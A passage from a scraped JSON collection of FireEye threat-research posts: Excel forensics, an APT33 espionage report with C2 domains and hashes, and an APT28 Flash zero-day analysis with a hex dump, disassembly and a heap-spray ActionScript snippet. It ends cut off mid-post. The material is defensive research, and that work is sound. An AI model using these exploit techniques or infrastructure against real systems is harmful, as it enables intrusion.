more efficient way to reference the threat intelligence data sheet. XLOOKUP is a newer function introduced to Excel to replace the legacy VLOOKUP function and, at the time of writing this post, is only available to “O365 subscribers in the Monthly channel”, according to Microsoft. In this instance, we will also leverage Excel’s dynamic arrays and “spilling” to fill in this data more efficiently, instead of making an XLOOKUP function for each column. NOTE: To utilize dynamic arrays and spilling, the data we are seeking to enrich cannot be in the form of a “Table” object. Instead, we will apply filters to the top row of our O365 data set by selecting the “Filter” option under “Sort & Filter” in the “Home” ribbon: Figure 6: Filter option To reference the threat intelligence data sheet using XLOOKUP, we will use the following formula: Figure 7: XLOOKUP function for enrichment There are three parts to this XLOOKUP formula: Value to lookup: This dictates what cell value we are going to look up more information for. In this case, it is cell G2, which is the IP address. Array to look in: This will be the array of data in which Excel will search for the value to look up. Excel does exact matching by default for XLOOKUP. In the aforementioned example, we are searching in ‘IP Address Intel’!$A$2:$A:$15. In other words, we are looking in the other sheet in this workbook titled “IP Address Intel”, then in that sheet, search in the cell range of A2 to A15: Figure 8: XLOOKUP array to look in Note the use of the “$” to ensure these are absolute references and will not be updated by Excel if we copy this formula to other cells. Array of data to return: This part will be the array of data from which Excel will return data. In this case, Excel will return the data contained within the absolute range of B2 to D15 from the “IP Address Intel” sheet for the value that was looked up. In the aforementioned example formula, it will return the values in the row for the IP address 198.51.100.126: Figure 9: Data to be returned from ‘IP Address Intel’ sheet Because this is leveraging dynamic arrays and spilling, all three cells of the returned data will populate, as seen in Figure 4. Now that our dataset is completely enriched by either using VLOOKUP or XLOOKUP, we can start hunting for anomalous activity. As a quick first step, since we know at least a handful of IP addresses are potentially malicious, we can filter on the “Threat Intel” column for all rows that match “TMP.OGRE” and reveal logons with source IP addresses related to known threat actors. Now we have timeframes and suspected compromised accounts to pivot off of for additional hunting through other data. PIVOT! PIVOT! PIVOT! One of the most useful tools for highlighting anomalies by summarizing data, performing frequency analysis and quickly obtaining other statistics about a given dataset is Excel’s PivotTable function . Location Anomalies Let’s utilize a PivotTable to perform frequency analysis on the location from which users logged in. This type of technique may highlight activity where a user account logged in from a location which is unusual for them. To create a PivotTable for our data, we can select any cell in our O365 data and select the entire range with Ctrl+A. Then, under the “Insert” tab in the ribbon, select “PivotTable”: Figure 10: PivotTable selection This will bring up a window, as seen in Figure 11, to confirm the data for which we want to make a PivotTable (Step 1 in Figure 11). Since we selected our O365 log data set with Ctrl+A, this should be automatically populated. It will also ask where we want to put the PivotTable (Step 2 in Figure 11). In this instance, we created another sheet called “PivotTable 1” to place the PivotTable: Figure 11: PivotTable creation Now that the PivotTable is created, we must select how we want to populate the PivotTable using our data. Remember, we are trying to determine the locations from which all users logged in. We will want a row for each user and a sub-row for each location the user has logged in from. Let’s add a count of how many times they logged in from each location as well. We will use the “Date” field to do this for this example: Figure 12: PivotTable field definitions Examining this table, we can immediately see there are two users with source location anomalies: Ginger Breadman and William Brody have a small number of logons from “FarFarAway”, which is abnormal for these users based on this data set. We can add more data to this PivotTable to get a timeframe of this suspicious activity by adding two more “Date” fields to the “Values” area. Excel defaults to “Count” of whatever field we drop in this area, but we will change this to the “Minimum” and “Maximum” values by using the “Value Field Settings”, as seen in Figure 13. Figure 13: Adding min and max dates Now we have a PivotTable that shows us anomalous locations for logons, as well as the timeframe in which the logons occurred, so we can hone our investigation. For this example, we also formatted all cells with timestamp values to reflect the format FireEye Mandiant typically uses during analysis by selecting all the appropriate cells, right-clicking and choosing “Format Cells”, and using a “Custom” format of “YYYY-MM-DD HH:MM:SS”. Figure 14: PivotTable with suspicious locations and timeframe IP Address Anomalies Geolocation anomalies may not always be valuable. However, using a similar configuration as the previous example, we can identify suspicious source IP addresses. We will add “User Principle Name” and “IP Address” fields as Rows, and “IP Address” as Values. Let’s also add the “App” field to Columns. Our field settings and resulting table are displayed in Figure 15: Figure 15: PivotTable with IP addresses and apps With just a few clicks, we have a summarized table indicating which IP addresses each user logged in from, and which app they logged into. We can quickly identify two users logged in from IP addresses in the 203.0.113.0/24 range six times, and which applications they logged into from each of these IP addresses. While these are just a couple use cases, there are many ways to format and view evidence using PivotTables. We recommend trying PivotTables on any data set being reviewed with Excel and experimenting with the Rows, Columns, and Values parameters. We also recommend adjusting the PivotTable options , which can help reformat the table itself into a format that might fit requirements. Conclusion These Excel functions are used frequently during investigations at FireEye Mandiant and are considered important forensic analysis techniques. The examples we give here are just a glimpse into the utility of LOOKUP functions and PivotTables. LOOKUP functions can be used to reference a multitude of data sources and can be applied in other situations during investigations such as tracking remediation and analysis efforts. PivotTables may be used in a variety of ways as well, depending on what data is available, and what sort of information is being analyzed to identify suspicious activity. Employing these techniques, alongside the ones we highlighted previously, on a consistent basis will go a long way in \"excelerating\" forensic analysis skills and efficiency. Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2017/09/apt33-insights-into-iranian-cyber-espionage.html": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2017-09-20",
                    "source": "www.fireeye.com"
                },
                "text": "When discussing suspected Middle Eastern hacker groups with destructive capabilities, many automatically think of the suspected Iranian group that previously used SHAMOON – aka Disttrack – to target organizations in the Persian Gulf. However, over the past few years, we have been tracking a separate, less widely known suspected Iranian group with potential destructive capabilities, whom we call APT33. Our analysis reveals that APT33 is a capable group that has carried out cyber espionage operations since at least 2013. We assess APT33 works at the behest of the Iranian government. Recent investigations by FireEye’s Mandiant incident response consultants combined with FireEye iSIGHT Threat Intelligence analysis have given us a more complete picture of APT33’s operations, capabilities, and potential motivations. This blog highlights some of our analysis. Our detailed report on FireEye Threat Intelligence contains a more thorough review of our supporting evidence and analysis. We will also be discussing this threat group further during our webinar on Sept. 21 at 8 a.m. ET. Targeting APT33 has targeted organizations – spanning multiple industries – headquartered in the United States, Saudi Arabia and South Korea. APT33 has shown particular interest in organizations in the aviation sector involved in both military and commercial capacities, as well as organizations in the energy sector with ties to petrochemical production. From mid-2016 through early 2017, APT33 compromised a U.S. organization in the aerospace sector and targeted a business conglomerate located in Saudi Arabia with aviation holdings. During the same time period, APT33 also targeted a South Korean company involved in oil refining and petrochemicals. More recently, in May 2017, APT33 appeared to target a Saudi organization and a South Korean business conglomerate using a malicious file that attempted to entice victims with job vacancies for a Saudi Arabian petrochemical company. We assess the targeting of multiple companies with aviation-related partnerships to Saudi Arabia indicates that APT33 may possibly be looking to gain insights on Saudi Arabia’s military aviation capabilities to enhance Iran’s domestic aviation capabilities or to support Iran’s military and strategic decision making vis a vis Saudi Arabia. We believe the targeting of the Saudi organization may have been an attempt to gain insight into regional rivals, while the targeting of South Korean companies may be due to South Korea’s recent partnerships with Iran’s petrochemical industry as well as South Korea’s relationships with Saudi petrochemical companies. Iran has expressed interest in growing their petrochemical industry and often posited this expansion in competition to Saudi petrochemical companies. APT33 may have targeted these organizations as a result of Iran’s desire to expand its own petrochemical production and improve its competitiveness within the region. The generalized targeting of organizations involved in energy and petrochemicals mirrors previously observed targeting by other suspected Iranian threat groups, indicating a common interest in the sectors across Iranian actors. Figure 1 shows the global scope of APT33 targeting. Figure 1: Scope of APT33 Targeting Spear Phishing APT33 sent spear phishing emails to employees whose jobs related to the aviation industry. These emails included recruitment themed lures and contained links to malicious HTML application (.hta) files. The .hta files contained job descriptions and links to legitimate job postings on popular employment websites that would be relevant to the targeted individuals. An example .hta file excerpt is provided in Figure 2. To the user, the file would appear as benign references to legitimate job postings; however, unbeknownst to the user, the .hta file also contained embedded code that automatically downloaded a custom APT33 backdoor. Figure 2: Excerpt of an APT33 malicious .hta file We assess APT33 used a built-in phishing module within the publicly available ALFA TEaM Shell (aka ALFASHELL) to send hundreds of spear phishing emails to targeted individuals in 2016. Many of the phishing emails appeared legitimate – they referenced a specific job opportunity and salary, provided a link to the spoofed company’s employment website, and even included the spoofed company’s Equal Opportunity hiring statement. However, in a few cases, APT33 operators left in the default values of the shell’s phishing module. These appear to be mistakes, as minutes after sending the emails with the default values, APT33 sent emails to the same recipients with the default values removed. As shown in Figure 3, the “fake mail” phishing module in the ALFA Shell contains default values, including the sender email address (solevisible@gmail[.]com), subject line (“your site hacked by me”), and email body (“Hi Dear Admin”). Figure 3: ALFA TEaM Shell v2-Fake Mail (Default) Figure 4 shows an example email containing the default values the shell. Figure 4: Example Email Generated by the ALFA Shell with Default Values Domain Masquerading APT33 registered multiple domains that masquerade as Saudi Arabian aviation companies and Western organizations that together have partnerships to provide training, maintenance and support for Saudi’s military and commercial fleet. Based on observed targeting patterns, APT33 likely used these domains in spear phishing emails to target victim organizations. The following domains masquerade as these organizations: Boeing, Alsalam Aircraft Company, Northrop Grumman Aviation Arabia (NGAAKSA), and Vinnell Arabia. boeing.servehttp[.]com alsalam.ddns[.]net ngaaksa.ddns[.]net ngaaksa.sytes[.]net vinnellarabia.myftp[.]org Boeing, Alsalam Aircraft company, and Saudia Aerospace Engineering Industries entered into a joint venture to create the Saudi Rotorcraft Support Center in Saudi Arabia in 2015 with the goal of servicing Saudi Arabia’s rotorcraft fleet and building a self-sustaining workforce in the Saudi aerospace supply base. Alsalam Aircraft Company also offers military and commercial maintenance, technical support, and interior design and refurbishment services. Two of the domains appeared to mimic Northrop Grumman joint ventures. These joint ventures – Vinnell Arabia and Northrop Grumman Aviation Arabia – provide aviation support in the Middle East, specifically in Saudi Arabia. Both Vinnell Arabia and Northrop Grumman Aviation Arabia have been involved in contracts to train Saudi Arabia’s Ministry of National Guard. Identified Persona Linked to Iranian Government We identified APT33 malware tied to an Iranian persona who may have been employed by the Iranian government to conduct cyber threat activity against its adversaries. We assess an actor using the handle “xman_1365_x” may have been involved in the development and potential use of APT33’s TURNEDUP backdoor due to the inclusion of the handle in the processing-debugging (PDB) paths of many of TURNEDUP samples. An example can be seen in Figure 5. Figure 5: “xman_1365_x\" PDB String in TURNEDUP Sample Xman_1365_x was also a community manager in the Barnamenevis Iranian programming and software engineering forum, and registered accounts in the well-known Iranian Shabgard and Ashiyane forums, though we did not find evidence to suggest that this actor was ever a formal member of the Shabgard or Ashiyane hacktivist groups. Open source reporting links the “xman_1365_x” actor to the “Nasr Institute,” which is purported to be equivalent to Iran’s “cyber army” and controlled by the Iranian government. Separately, additional evidence ties the “Nasr Institute” to the 2011-2013 attacks on the financial industry, a series of denial of service attacks dubbed Operation Ababil. In March 2016, the U.S. Department of Justice unsealed an indictment that named two individuals allegedly hired by the Iranian government to build attack infrastructure and conduct distributed denial of service attacks in support of Operation Ababil. While the individuals and the activity described in indictment are different than what is discussed in this report, it provides some evidence that individuals associated with the “Nasr Institute” may have ties to the Iranian government. Potential Ties to Destructive Capabilities and Comparisons with SHAMOON One of the droppers used by APT33, which we refer to as DROPSHOT, has been linked to the wiper malware SHAPESHIFT. Open source research indicates SHAPESHIFT may have been used to target organizations in Saudi Arabia. Although we have only directly observed APT33 use DROPSHOT to deliver the TURNEDUP backdoor, we have identified multiple DROPSHOT samples in the wild that drop SHAPESHIFT. The SHAPESHIFT malware is capable of wiping disks, erasing volumes and deleting files, depending on its configuration. Both DROPSHOT and SHAPESHIFT contain Farsi language artifacts, which indicates they may have been developed by a Farsi language speaker (Farsi is the predominant and official language of Iran). While we have not directly observed APT33 use SHAPESHIFT or otherwise carry out destructive operations, APT33 is the only group that we have observed use the DROPSHOT dropper. It is possible that DROPSHOT may be shared amongst Iran-based threat groups, but we do not have any evidence that this is the case. In March 2017, Kasperksy released a report that compared DROPSHOT (which they call Stonedrill) with the most recent variant of SHAMOON (referred to as Shamoon 2.0). They stated that both wipers employ anti-emulation techniques and were used to target organizations in Saudi Arabia, but also mentioned several differences. For example, they stated DROPSHOT uses more advanced anti-emulation techniques, utilizes external scripts for self-deletion, and uses memory injection versus external drivers for deployment. Kaspersky also noted the difference in resource language sections: SHAMOON embeds Arabic-Yemen language resources while DROPSHOT embeds Farsi (Persian) language resources. We have also observed differences in both targeting and tactics, techniques and procedures (TTPs) associated with the group using SHAMOON and APT33. For example, we have observed SHAMOON being used to target government organizations in the Middle East, whereas APT33 has targeted several commercial organizations both in the Middle East and globally. APT33 has also utilized a wide range of custom and publicly available tools during their operations. In contrast, we have not observed the full lifecycle of operations associated with SHAMOON, in part due to the wiper removing artifacts of the earlier stages of the attack lifecycle. Regardless of whether DROPSHOT is exclusive to APT33, both the malware and the threat activity appear to be distinct from the group using SHAMOON. Therefore, we assess there may be multiple Iran-based threat groups capable of carrying out destructive operations. Additional Ties Bolster Attribution to Iran APT33’s targeting of organizations involved in aerospace and energy most closely aligns with nation-state interests, implying that the threat actor is most likely government sponsored. This coupled with the timing of operations – which coincides with Iranian working hours – and the use of multiple Iranian hacker tools and name servers bolsters our assessment that APT33 may have operated on behalf of the Iranian government. The times of day that APT33 threat actors were active suggests that they were operating in a time zone close to 04:30 hours ahead of Coordinated Universal Time (UTC). The time of the observed attacker activity coincides with Iran’s Daylight Time , which is +0430 UTC. APT33 largely operated on days that correspond to Iran’s workweek, Saturday to Wednesday. This is evident by the lack of attacker activity on Thursday, as shown in Figure 6. Public sources report that Iran works a Saturday to Wednesday or Saturday to Thursday work week, with government offices closed on Thursday and some private businesses operating on a half day schedule on Thursday. Many other Middle East countries have elected to have a Friday and Saturday weekend. Iran is one of few countries that subscribes to a Saturday to Wednesday workweek. APT33 leverages popular Iranian hacker tools and DNS servers used by other suspected Iranian threat groups. The publicly available backdoors and tools utilized by APT33 – including NANOCORE, NETWIRE, and ALFA Shell – are all available on Iranian hacking websites, associated with Iranian hackers, and used by other suspected Iranian threat groups. While not conclusive by itself, the use of publicly available Iranian hacking tools and popular Iranian hosting companies may be a result of APT33’s familiarity with them and lends support to the assessment that APT33 may be based in Iran. Figure 6: APT33 Interactive Commands by Day of Week Outlook and Implications Based on observed targeting, we believe APT33 engages in strategic espionage by targeting geographically diverse organizations across multiple industries. Specifically, the targeting of organizations in the aerospace and energy sectors indicates that the threat group is likely in search of strategic intelligence capable of benefitting a government or military sponsor. APT33’s focus on aviation may indicate the group’s desire to gain insight into regional military aviation capabilities to enhance Iran’s aviation capabilities or to support Iran’s military and strategic decision making. Their targeting of multiple holding companies and organizations in the energy sectors align with Iranian national priorities for growth, especially as it relates to increasing petrochemical production. We expect APT33 activity will continue to cover a broad scope of targeted entities, and may spread into other regions and sectors as Iranian interests dictate. APT33’s use of multiple custom backdoors suggests that they have access to some of their own development resources, with which they can support their operations, while also making use of publicly available tools. The ties to SHAPESHIFT may suggest that APT33 engages in destructive operations or that they share tools or a developer with another Iran-based threat group that conducts destructive operations. Appendix Malware Family Descriptions Malware Family Description Availability DROPSHOT Dropper that has been observed dropping and launching the TURNEDUP backdoor, as well as the SHAPESHIFT wiper malware Non-Public NANOCORE Publicly available remote access Trojan (RAT) available for purchase. It is a full-featured backdoor with a plugin framework Public NETWIRE Backdoor that attempts to steal credentials from the local machine from a variety of sources and supports other standard backdoor features. Public TURNEDUP Backdoor capable of uploading and downloading files, creating a reverse shell, taking screenshots, and gathering system information Non-Public Indicators of Compromise APT33 Domains Likely Used in Initial Targeting Domain boeing.servehttp[.]com alsalam.ddns[.]net ngaaksa.ddns[.]net ngaaksa.sytes[.]net vinnellarabia.myftp[.]org APT33 Domains / IPs Used for C2 C2 Domain MALWARE managehelpdesk[.]com NANOCORE microsoftupdated[.]com NANOCORE osupd[.]com NANOCORE mywinnetwork.ddns[.]net NETWIRE www.chromup[.]com TURNEDUP www.securityupdated[.]com TURNEDUP googlmail[.]net TURNEDUP microsoftupdated[.]net TURNEDUP syn.broadcaster[.]rocks TURNEDUP www.googlmail[.]net TURNEDUP Publicly Available Tools used by APT33 MD5 MALWARE Compile Time (UTC) 3f5329cf2a829f8840ba6a903f17a1bf NANOCORE 2017/1/11 2:20 10f58774cd52f71cd4438547c39b1aa7 NANOCORE 2016/3/9 23:48 663c18cfcedd90a3c91a09478f1e91bc NETWIRE 2016/6/29 13:44 6f1d5c57b3b415edc3767b079999dd50 NETWIRE 2016/5/29 14:11 Unattributed DROPSHOT / SHAPESHIFT MD5 Hashes MD5 MALWARE Compile Time (UTC) 0ccc9ec82f1d44c243329014b82d3125 DROPSHOT (drops SHAPESHIFT n/a - timestomped fb21f3cea1aa051ba2a45e75d46b98b8 DROPSHOT n/a - timestomped 3e8a4d654d5baa99f8913d8e2bd8a184 SHAPESHIFT 2016/11/14 21:16:40 6b41980aa6966dda6c3f68aeeb9ae2e0 SHAPESHIFT 2016/11/14 21:16:40 APT33 Malware MD5 Hashes MD5 MALWARE Compile Time (UTC) 8e67f4c98754a2373a49eaf53425d79a DROPSHOT (drops TURNEDUP) 2016/10/19 14:26 c57c5529d91cffef3ec8dadf61c5ffb2 TURNEDUP 2014/6/1 11:01 c02689449a4ce73ec79a52595ab590f6 TURNEDUP 2016/9/18 10:50 59d0d27360c9534d55596891049eb3ef TURNEDUP 2016/3/8 12:34 59d0d27360c9534d55596891049eb3ef TURNEDUP 2016/3/8 12:34 797bc06d3e0f5891591b68885d99b4e1 TURNEDUP 2015/3/12 5:59 8e6d5ef3f6912a7c49f8eb6a71e18ee2 TURNEDUP 2015/3/12 5:59 32a9a9aa9a81be6186937b99e04ad4be TURNEDUP 2015/3/12 5:59 a272326cb5f0b73eb9a42c9e629a0fd8 TURNEDUP 2015/3/9 16:56 a813dd6b81db331f10efaf1173f1da5d TURNEDUP 2015/3/9 16:56 de9e3b4124292b4fba0c5284155fa317 TURNEDUP 2015/3/9 16:56 a272326cb5f0b73eb9a42c9e629a0fd8 TURNEDUP 2015/3/9 16:56 b3d73364995815d78f6d66101e718837 TURNEDUP 2014/6/1 11:01 de7a44518d67b13cda535474ffedf36b TURNEDUP 2014/6/1 11:01 b5f69841bf4e0e96a99aa811b52d0e90 TURNEDUP 2014/6/1 11:01 a2af2e6bbb6551ddf09f0a7204b5952e TURNEDUP 2014/6/1 11:01 b189b21aafd206625e6c4e4a42c8ba76 TURNEDUP 2014/6/1 11:01 aa63b16b6bf326dd3b4e82ffad4c1338 TURNEDUP 2014/6/1 11:01 c55b002ae9db4dbb2992f7ef0fbc86cb TURNEDUP 2014/6/1 11:01 c2d472bdb8b98ed83cc8ded68a79c425 TURNEDUP 2014/6/1 11:01 c6f2f502ad268248d6c0087a2538cad0 TURNEDUP 2014/6/1 11:01 c66422d3a9ebe5f323d29a7be76bc57a TURNEDUP 2014/6/1 11:01 ae47d53fe8ced620e9969cea58e87d9a TURNEDUP 2014/6/1 11:01 b12faab84e2140dfa5852411c91a3474 TURNEDUP 2014/6/1 11:01 c2fbb3ac76b0839e0a744ad8bdddba0e TURNEDUP 2014/6/1 11:01 a80c7ce33769ada7b4d56733d02afbe5 TURNEDUP 2014/6/1 11:01 6a0f07e322d3b7bc88e2468f9e4b861b TURNEDUP 2014/6/1 11:01 b681aa600be5e3ca550d4ff4c884dc3d TURNEDUP 2014/6/1 11:01 ae870c46f3b8f44e576ffa1528c3ea37 TURNEDUP 2014/6/1 11:01 bbdd6bb2e8827e64cd1a440e05c0d537 TURNEDUP 2014/6/1 11:01 0753857710dcf96b950e07df9cdf7911 TURNEDUP 2013/4/10 10:43 d01781f1246fd1b64e09170bd6600fe1 TURNEDUP 2013/4/10 10:43 1381148d543c0de493b13ba8ca17c14f TURNEDUP 2013/4/10 10:43 Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2015/04/probable_apt28_useo.html": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2015-04-18",
                    "source": "www.fireeye.com"
                },
                "text": "FireEye Labs recently detected a limited APT campaign exploiting zero-day vulnerabilities in Adobe Flash and a brand-new one in Microsoft Windows. Using the Dynamic Threat Intelligence Cloud (DTI) , FireEye researchers detected a pattern of attacks beginning on April 13 th , 2015. Adobe independently patched the vulnerability (CVE-2015-3043) in APSB15-06 . Through correlation of technical indicators and command and control infrastructure, FireEye assess that APT28 is probably responsible for this activity. Microsoft is aware of the outstanding local privilege escalation vulnerability in Windows (CVE-2015-1701). While there is not yet a patch available for the Windows vulnerability, updating Adobe Flash to the latest version will render this in-the-wild exploit innocuous. We have only seen CVE-2015-1701 in use in conjunction with the Adobe Flash exploit for CVE-2015-3043. The Microsoft Security Team is working on a fix for CVE-2015-1701. Exploit Overview The high level flow of the exploit is as follows: 1.       User clicks link to attacker controlled website 2.       HTML/JS launcher page serves Flash exploit 3.       Flash exploit triggers CVE-2015-3043, executes shellcode 4.       Shellcode downloads and runs executable payload 5.       Executable payload exploits local privilege escalation (CVE-2015-1701) to steal System token The Flash exploit is served from unobfuscated HTML/JS. The launcher page picks one of two Flash files to deliver depending upon the target’s platform (Windows 32 versus 64bits). The Flash exploit is mostly unobfuscated with only some light variable name mangling. The attackers relied heavily on the CVE-2014-0515 Metasploit module, which is well documented. It is ROPless, and instead constructs a fake vtable for a FileReference object that is modified for each call to a Windows API. The payload exploits a local privilege escalation vulnerability in the Windows kernel if it detects that it is running with limited privileges. It uses the vulnerability to run code from userspace in the context of the kernel, which modifies the attacker’s process token to have the same privileges as that of the System process. CVE-2015-3043 Exploit The primary difference between the CVE-2014-0515 metasploit module and this exploit is, obviously, the vulnerability. CVE-2014-0515 exploits a vulnerability in Flash’s Shader processing, whereas CVE-2015-3043 exploits a vulnerability in Flash’s FLV processing. The culprit FLV file is embedded within AS3 in two chunks, and is reassembled at runtime. Vulnerability A buffer overflow vulnerability exists in Adobe Flash Player (<=17.0.0.134) when parsing malformed FLV objects. Attackers exploiting the vulnerability can corrupt memory and gain remote code execution. In the exploit, the attacker embeds the FLV object directly in the ActionScript code, and plays the video using NetStream class. In memory, it looks like the following: 0000000: 46 4c 56 01 05 00 00 00 09 00 00 00 00 12 00 00  FLV............. 0000010: f4 00 00 00 00 00 00 00 02 00 0a 6f 6e 4d 65 74  ...........onMet 0000020: 61 44 61 74 61 08 00 00 00 0b 00 08 64 75 72 61  aData.......dura 0000030: 74 69 6f 6e 00 40 47 ca 3d 70 a3 d7 0a 00 05 77  tion.@G.=p.....w 0000040: 69 64 74 68 00 40 74 00 00 00 00 00 00 00 06 68  idth.@t........h 0000050: 65 69 67 68 74 00 40 6e 00 00 00 00 00 00 00 0d  eight.@n........ 0000060: 76 69 64 65 6f 64 61 74 61 72 61 74 65 00 00 00  videodatarate... ….. 0003b20: 27 6e ee 72 87 1b 47 f7 41 a0 00 00 00 3a 1b 08  'n.r..G.A....:.. 0003b30: 00 04 41 00 00 0f 00 00 00 00 68 ee ee ee ee ee  ..A.......h..... 0003b40: ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee  ................ 0003b50: ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee  ................ 0003b60: ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee  ................ Files of the FLV file format contain a sequence of Tag structures. In Flash, these objects are created when parsing FLV Tags: .text:1018ACE9 sub_1018ACE9    proc near               ; CODE XREF: sub_1018BBAC+2Bp .text:1018ACE9                                         ; sub_10192797+1A1p ... .text:1018ACE9 .text:1018ACE9 arg_0           = dword ptr  4 .text:1018ACE9 .text:1018ACE9                 mov     eax, ecx .text:1018ACEB                 mov     ecx, [esp+arg_0] .text:1018ACEF                 mov     dword ptr [eax], offset off_10BA771C .text:1018ACF5                 mov     dword ptr [eax+24h], 1 .text:1018ACFC                 and     dword ptr [eax+14h], 0 .text:1018AD00                 mov     [eax+28h], ecx .text:1018AD03                 mov     byte ptr [eax+20h], 0 .text:1018AD07                 retn    4 .text:1018AD07 sub_1018ACE9    endp In the case of this exploit, a Tag structure begins at offset 0x3b2f into the FLV stream that, when parsed, populates the Tag structure as follows: Tag 2: UINT_8 type: 8 UINT_24 datasize: 1089 UINT_24 timestamp: 15 UINT_8 timestamphi: 0 UINT_24 streamid: 0 UINT_4 fmt: 6 UINT_2 sr: 2 UINT_1 bits: 0 UINT_1 channels: 0 UBYTE data[1088]: \\xee\\xee\\xee\\xee… UINT_32 lastsize: 0xeeeeeeee Beginning within the data field, all contents of the FLV stream become 0xEE. Consequently, the data and lastsize fields are mangled, and one final tag technically exists consisting exclusively of 0xEE: Tag 3: UINT_8 type: 0xEE UINT_24 datasize: 0xEEEEEE … One can see the datasize field of Tag2 populated from the attacker's FLV stream below: .text:10192943                 mov     eax, [ebx+24h] .text:10192946                 mov     [esi+14h], eax .text:10192949                 movzx   eax, byte ptr [ebx+19h] ; 00 .text:1019294D                 movzx   ecx, byte ptr [ebx+1Ah] ; 04 .text:10192951                 shl     eax, 8 .text:10192954                 or      eax, ecx .text:10192956                 movzx   ecx, byte ptr [ebx+1Bh] ; 41 .text:1019295A                 shl     eax, 8 .text:1019295D                 or      eax, ecx .text:1019295F                 mov     ecx, ebx .text:10192961                 mov     [esi+0Ch], eax  ; 0x441 .text:10192964                 call    sub_1002E2B3 The buffer is allocated with fixed size 0x2000: .text:101A647E                 push    2000h .text:101A6483                 mov     ecx, esi .text:101A6485                 call    sub_101A6257    ; alloc 0x2000 buffer, store in esi+0xDC …… .text:101A627F                 push    0 .text:101A6281                 push    edi             ; 0x2000 .text:101A6282                 call    sub_105EBEB0 .text:101A6287                 pop     ecx .text:101A6288                 pop     ecx .text:101A6289                 mov     [esi+0DCh], eax Since the size is controlled by the attacker, it’s possible to overflow the fixed size buffer with certain data. A datasize of 0x441 results in a value here of 0x1100 passed to sub_100F88F8, which memcopies 0x2200 bytes in 0x11 chunks of 0x200. The last memcpy overflows the fixed size 0x2000 buffer into a adjacent heap memory. Attackers spray the heap with array of Vector, 0x7fe * 4 + 8 == 0x2000, and create holes of such size, which will be allocated by the said object. while (_local_2 < this._bp35) // _bp35 == 0x2000 { this._ok47[_local_2] = new Vector.<uint>(this._lb60); // _lb60 == 0x07FE _local_3 = 0x00; while (_local_3 < this._lb60) { this._ok47[_local_2][_local_3] = 0x41414141; _local_3++; }; _local_2 = (_local_2 + 0x01); }; _local_2 = 0x00; while (_local_2 < this._bp35) { this._ok47[_local_2] = null; _local_2 = (_local_2 + 0x02); }; As the previous picture demonstrated, the followed Vector object’s length field being overflowed as 0x80007fff, which enables the attacker to read/write arbitrary data within user space. Shellcode Shellcode is passed to the exploit from HTML in flashvars. The shellcode downloads the next stage payload, which is an executable passed in plaintext, to the temp directory with UrlDownloadToFileA, which it then runs with WinExec. Payload & C2 This exploit delivers a malware variant that shares characteristics with the APT28 backdoors CHOPSTICK and CORESHELL malware families, both described in our APT28 whitepaper .  The malware uses an RC4 encryption key that was previously used by the CHOPSTICK backdoor.  And the C2 messages include a checksum algorithm that resembles those used in CHOPSTICK backdoor communications.  In addition, the network beacon traffic for the new malware resembles those used by the CORESHELL backdoor.  Like CORESHELL, one of the beacons includes a process listing from the victim host.  And like CORESHELL, the new malware attempts to download a second-stage executable. One of the C2 locations for the new payload, 87.236.215[.]246 , also hosts a suspected APT28 domain ssl-icloud[.]com .  The same subnet ( 87.236.215.0/24 ) also hosts several known or suspected APT28 domains, as seen in Table 1. The target firm is an international government entity in an industry vertical that aligns with known APT28 targeting. CVE-2015-1701 Exploit The payload contains an exploit for the unpatched local privilege escalation vulnerability CVE-2015-1701 in Microsoft Windows. The exploit uses CVE-2015-1701 to execute a callback in userspace. The callback gets the EPROCESS structures of the current process and the System process, and copies data from the System token into the token of the current process. Upon completion, the payload continues execution in usermode with the privileges of the System process. Because CVE-2015-3043 is already patched, this remote exploit will not succeed on a fully patched system. If an attacker wanted to exploit CVE-2015-1701, they would first have to be executing code on the victim’s machine. Barring authorized access to the victim’s machine, the attacker would have to find some other means, such as crafting a new Flash exploit, to deliver a CVE-2015-1701 payload. Microsoft is aware of CVE-2015-1701 and is working on a fix. CVE-2015-1701 does not affect Windows 8 and later. Acknowledgements Thank you to all of the contributors to this blog! The following people in FireEye: Dan Caselden, Yasir Khalid, James “Tom” Bennett, GenWei Jiang, Corbin Souffrant, Joshua Homan, Jonathan Wrolstad, Chris Phillips, Darien Kindlund Microsoft & Adobe security teams Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2014/06/a-not-so-civic-duty-asprox-botnet-campaign-spreads-court-dates-and-malware.html": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2014-06-16",
                    "source": "www.fireeye.com"
                },
                "text": "Executive Summary FireEye Labs has been tracking a recent spike in malicious email detections that we attribute to a campaign that began in 2013. While malicious email campaigns are nothing new, this one is significant in that we are observing mass-targeting attackers adopting the malware evasion methods pioneered by the stealthier APT attackers. And this is certainly a high-volume business, with anywhere from a few hundred to ten thousand malicious emails sent daily – usually distributing between 50 and 500,000 emails per outbreak. Through the FireEye Dynamic Threat Intelligence (DTI) cloud , FireEye Labs discovered that each and every major spike in email blasts brought a change in the attributes of their attack. These changes have made it difficult for anti-virus, IPS, firewalls and file-based sandboxes to keep up with the malware and effectively protect endpoints from infection. Worse, if past is prologue, we can expect other malicious, mass-targeting email operators to adopt this approach to bypass traditional defenses. This blog will cover the trends of the campaign, as well as provide a short technical analysis of the payload. Campaign Details Figure 1: Attack Architecture The campaign first appeared in late December of 2013 and has since been seen in fairly cyclical patterns each month. It appears that the threat actors behind this campaign are fairly responsive to published blogs and reports surrounding their malware techniques, tweaking their malware accordingly to continuously try and evade detection with success. In late 2013, malware labeled as Kuluoz, the specific spam component of the Asprox botnet, was discovered to be the main payload of what would become the first malicious email campaign. Since then, the threat actors have continuously tweaked the malware by changing its hardcoded strings, remote access commands, and encryption keys. Previously, Asprox malicious email campaigns targeted various industries in multiple countries and included a URL link in the body. The current version of Asprox includes a simple zipped email attachment that contains the malicious payload “exe.” Figure 2 below represents a sample message while Figure 3 is an example of the various court-related email headers used in the campaign. Figure 2 Email Sample Figure 3 Email Headers Some of the recurring campaign that Asporox used includes themes focused around airline tickets, postal services and license keys. In recent months however, the court notice and court request-themed emails appear to 